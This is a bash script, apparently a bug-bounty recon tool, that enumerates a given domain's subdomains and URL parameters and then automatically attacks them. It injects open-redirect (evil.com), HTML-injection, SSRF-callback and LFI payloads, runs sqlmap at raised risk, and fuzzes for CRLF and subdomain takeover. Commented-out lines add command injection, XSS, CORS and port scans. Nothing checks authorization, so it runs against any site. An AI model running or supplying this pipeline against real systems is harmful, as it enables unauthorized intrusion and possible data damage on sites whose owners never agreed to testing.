#! /bin/bash 
url=$1

echo "
 _____ _          _     _             ____                      
|_   _| |__   ___| |   (_) ___  _ __ |  _ \ ___  ___ ___  _ __  
  | | | '_ \ / _ \ |   | |/ _ \| '_ \| |_) / _ \/ __/ _ \| '_ \ 
  | | | | | |  __/ |___| | (_) | | | |  _ <  __/ (_| (_) | | | |
  |_| |_| |_|\___|_____|_|\___/|_| |_|_| \_\___|\___\___/|_| |_|"
echo "        @Abbas Cyber Security"

if [ ! -d "$url" ]; then
      mkdir $url
fi
if [ ! -d "$url/recon" ]; then
      mkdir $url/recon
fi

if [ ! -d "$url/params_vuln" ]; then
          mkdir $url/params_vuln
fi

if [ ! -d "$url/subs_vuln" ]; then
          mkdir $url/subs_vuln
fi

if [ ! -d "$url/subs_vuln/false_positive" ]; then
          mkdir $url/subs_vuln/false_positive
fi

if [ ! -d "$url/params_vuln/false_positive" ]; then
          mkdir $url/params_vuln/false_positive
fi

if [ ! -d "$url/recon/EyeWitness" ]; then
      mkdir $url/recon/EyeWitness
fi
#---------------------------------------------------------------------------------
#-----------------------------Finding SubDomains----------------------------------
#----------------------------------------------------------------------------------
echo "[+]Enumurating SubDomains Using Amass..." 
amass enum -d $url >> $url/recon/amass.txt
cat $url/recon/amass.txt | grep $url >> $url/recon/final.txt
rm $url/recon/amass.txt

echo "[+]Enumurating SubDomains Using Assetfinder..." 
assetfinder $url >> $url/recon/assetfinder.txt
cat $url/recon/assetfinder.txt | grep $url >> $url/recon/final.txt
rm $url/recon/assetfinder.txt

echo "[+]Enumurating SubDomains Using SubFinder..."
subfinder -d $url -o $url/recon/subfinder.txt
cat $url/recon/subfinder.txt | grep $url >> $url/recon/final.txt
rm $url/recon/subfinder.txt

echo "[+]Enumurating SubDomains Using Findomain..." 
findomain -t $url -q >> $url/recon/findomain.txt
cat $url/recon/findomain.txt | grep $url >> $url/recon/final.txt
rm $url/recon/findomain.txt

echo "[+]Enumurating SubDomains Using Sublist3r..."
python3 /opt/Sublist3r/sublist3r.py -d $url -o $1/recon/sublist3r.txt
cat $url/recon/sublist3r.txt | grep $url >> $url/recon/final.txt
rm $1/recon/sublist3r.txt 

echo "[+]Filtering Repeated Domains........." 
cat $url/recon/final.txt | sort -u | tee $url/recon/final_subs.txt 
rm $url/recon/final.txt 

echo "[+]Total Unique SubDomains" 
cat $url/recon/final_subs.txt | wc -l
#--------------------------------------------------------------------------------------------------
#-----------------------------------Filtering Live SubDomains--------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Removing Dead Domains Using httpx....." 
cat $url/recon/final_subs.txt | httpx --silent  >> $url/recon/live_check.txt

echo "[+]Removing Dead Domains Using httprobe....." 
cat $url/recon/final_subs.txt | httprobe >> $url/recon/live_check.txt

echo "[+]Analyzing Both httpx & httprobe....."
cat $url/recon/live_check.txt | sed 's/https\?:\/\///' | sort -u | tee $url/recon/live_subs.txt 
rm $url/recon/live_check.txt

echo "[+]Total Unique Live SubDomains....."
cat $url/recon/live_subs.txt | wc -l
#--------------------------------------------------------------------------------------------------
#-----------------------------------Enumurating Urls-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Enumurating Params From Paramspider...." 
python3 /opt/paramspider/paramspider.py --level high -d $url -p noor -o $1/recon/urls.txt
echo "[+]Enumurating Params From Waybackurls...." 
cat $1/recon/live_subs.txt | waybackurls | sort -u >> $1/recon/urls.txt
echo "[+]Enumurating Params From gau Tool...." 
gau --subs  $url | sort -u >> $url/recon/urls.txt 
echo "[+]Enumurating Params From gauPlus Tool...." 
cat $url/recon/live_subs.txt | gauplus | sort -u >> $1/recon/urls.txt

echo "[+]Filtering Dups..." 
cat $1/recon/urls.txt | sort -u | tee $1/recon/final_urls.txt 

rm $url/recon/urls.txt

echo "[+]Total Unique Params Found...." 
cat $url/recon/final_urls.txt | wc -l
#--------------------------------------------------------------------------------------------------
#-----------------------------------Enumurating Parameters-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Filtering Paramas From urls..." 
cat $1/recon/final_urls.txt | grep = | qsreplace noor >> $url/recon/final_params.txt 
figlet "Fuzzing Urls"
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Open Redirects----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For Openredirects" 
cat $url/recon/final_params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ;done >> $url/open_redirect.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For HTMLi Injection---------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For HTML Injection...." 
cat $url/recon/final_params.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host"; done > $url/htmli.txt
rm $url/recon/temp.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For XSS Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+]Testing For XSS Injection...." 
#dalfox file $url/htmli.txt -o $url/xss.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Command Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+]Testing For Command Injection...." 
#python3 /opt/commix/commix.py -m $url/recon/final_params.txt --batch 
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For CRLF Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For CRLF Injection...." 
crlfuzz -l $url/recon/final_params.txt -o $url/crlf_vuln.txt -s 
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For SQL Injection-----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For SQL Injection...." 
cat $url/recon/final_params.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2
#--------------------------------------------------------------------------------------------------
#-----------------------------------Checking For SSRF----------------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For External SSRF.........." 
cat $url/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/eSSRF.txt
rm $url/recon/ssrftest.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For XXE Injection----------------------------------------
#--------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Local File Inclusion----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Scanning For Local File Inclusion...."
cat $url/recon/final_params.txt | qsreplace FUZZ | while read host ; do ffuf -u $host -v -mr "root:x" -w payloads/lfi-small.txt ; done > $1/lfi.txt
#--------------------------------------------------------------------------------------------------
#-------------------------Checking For Server Side Template Injection-----------------------------
#--------------------------------------------------------------------------------------------------
#cat params.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -v -mr "noor49" -w payloads.txt ; done > ssti.txt

#--------------------------------------------------------------------------------------------------
#-------------------------------Scannning HTTP Parameter Smuggling---------------------------------
#--------------------------------------------------------------------------------------------------
figlet "Fuzzing Domains"
#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For SubDomain TakeOver------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+]Testing For SubTakeOver" 
subzy --targets  $url/recon/final_subs.txt  --hide_fails >> $url/sub_take_over.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------------Full Scan With Nuclei----------------------------------------
#--------------------------------------------------------------------------------------------------
echo "[+] Full Scan With Nuclei......." 
cat $1/recon/live_subs.txt | nuclei -t /root/nuclei-templates/ >> $1/nuclei.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------------Full Scan With Nikto----------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+] Full Scan With Nikto...." 
#nikto -h $url/recon/live_subs.txt > $url/nikto.txt
#------------------------------------------------------------------------------------------------------------
#----------------------------------------------Checking For CORS---------------------------------------------
#------------------------------------------------------------------------------------------------------------
#echo "[+]Checking For CORS...." | lolcat
#cat $url/recon/live_subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Origin:beebom.com | grep "beebom.com" && echo "$host" ; done >> $url/subs_vuln/cors.txt
#------------------------------------------------------------------------------------------------------------
#--------------------------------------Checking For XSS through Referer Header-------------------------------
#------------------------------------------------------------------------------------------------------------
#echo "[+]Checking For Xss in Referer Header...." | lolcat
#cat $url/recon/live_subs.txt | while read host do ; do curl $host --silent --path-as-is --insecure -L -I -H Referer:https://beebom.com/ | grep "beebom.com" && echo "$host" ; done >> $url/subs_vuln/xss_refer.txt

figlet "Recon v2"

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Taking LiveSubs ScreenShots-------------------------------------------
#------------------------------------------------------------------------------------------------------------
#echo "[+]Taking ScreenShots For Live Websites..." 
#python3 /opt/EyeWitness/Python/EyeWitness.py --web -f $url/recon/livesubs.txt --no-prompt -d $1/recon/EyeWitness --resolve --timeout 240
#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Whois-------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Headers--------------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Emails & passwords-------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For WAF -------------------------------------------
#------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------
#--------------------------------------Scanning For Built-in-with--------------------------------------------
#------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------
#-------------------------------Checking For Open Ports--------------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+] Scanning for open ports..."
#nmap -iL $url/recon/live_subs.txt -T4 -oA $url/recon/openports.txt
#--------------------------------------------------------------------------------------------------
#-------------------------------------Fuzzing For GitHub Recon----------------------------------------
#--------------------------------------------------------------------------------------------------
#echo "[+] Fuzzing For GitHub Recon"






